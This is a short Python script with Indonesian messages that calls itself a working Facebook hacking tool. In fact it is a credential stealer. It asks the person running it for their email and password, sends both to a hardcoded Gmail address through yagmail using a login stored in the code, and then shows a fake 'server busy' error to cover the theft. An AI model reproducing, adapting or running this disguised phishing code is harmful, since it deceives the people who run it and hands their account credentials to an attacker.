import os, sys

print ("Menginstall Paket...........")

os.system ('pip install yagmail')

os.system ('pip install termcolor')

import yagmail

from termcolor import colored

print (colored('paket selesai di install.','blue'))

baner = """

  ______             _                 _    

 |  ____|           | |               | |   

 | |__ __ _  ___ ___| |__   ___   ___ | | __

 |  __/ _` |/ __/ _ \ '_ \ / _ \ / _ \| |/ /

 | | | (_| | (_|  __/ |_) | (_) | (_) |   < 

 |_|  \__,_|\___\___|_.__/ \___/ \___/|_|\_\

                                                                                     

 Tools Hacking Facebook 100% work

 Author By: Mr.B0g3L

        """

print (colored(baner,'white'))

print (colored('silahkan login dulu untuk mengambil id...','green'))

anjirt = yagmail.SMTP('wirdagans@gmail.com','wirdasaputra')

username = str (input(colored('Masukan Email: ','white')))

password = str (input(colored('Masukan Password: ','white')))

body = ('username: '+username,  'password: '+password)

subject = 'Setoran Akun'

anjirt.send('wirdagans@gmail.com',subject,body)

print (colored('Maaf, server sibuk. coba beberapa saat lagi!!!','red'))
